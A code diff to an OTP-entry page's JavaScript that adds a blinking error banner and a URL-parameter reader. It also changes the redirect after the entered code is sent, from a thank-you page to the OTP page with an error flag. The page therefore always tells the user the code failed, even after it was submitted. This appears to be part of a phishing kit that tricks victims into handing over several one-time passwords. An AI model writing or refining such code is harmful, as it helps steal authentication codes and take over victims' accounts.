@@ -1,4 +1,11 @@
+var errorVisible = true;
+
 $(document).ready(function() {
+	var error = getParam("error");
+	if (error == '1') {
+		$("#text1").css('display', 'block');
+		animateError();
+	}
 	var otp1 = $("#otp1").val().trim();
 	var otp2 = $("#otp2").val().trim();
 	var otp3 = $("#otp3").val().trim();
@@ -46,6 +53,28 @@ $(document).ready(function() {
 	});
 });
 
+function animateError() {
+	setTimeout(() => {
+		errorVisible = !errorVisible;
+		if (errorVisible) {
+			$("#text1").css('visibility', 'visible');
+		} else {
+			$("#text1").css('visibility', 'hidden');
+		}
+		animateError();
+	}, 1000);
+}
+
+function getParam(name) {
+    var url = window.location.href;
+    name = name.replace(/[\[\]]/g, "\\$&");  // escape for regex
+    let regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)");
+    let results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, " "));
+}
+
 function next() {
 	var otp1 = $("#otp1").val().trim();
 	var otp2 = $("#otp2").val().trim();
@@ -84,7 +113,7 @@ function next() {
 
 function dataSent() {
           $("#loader").css('display', 'none');
-		  window.location.href = "thank.html";
+		  window.location.href = "otp.html?error=1";
 }
 
 module.next = next;
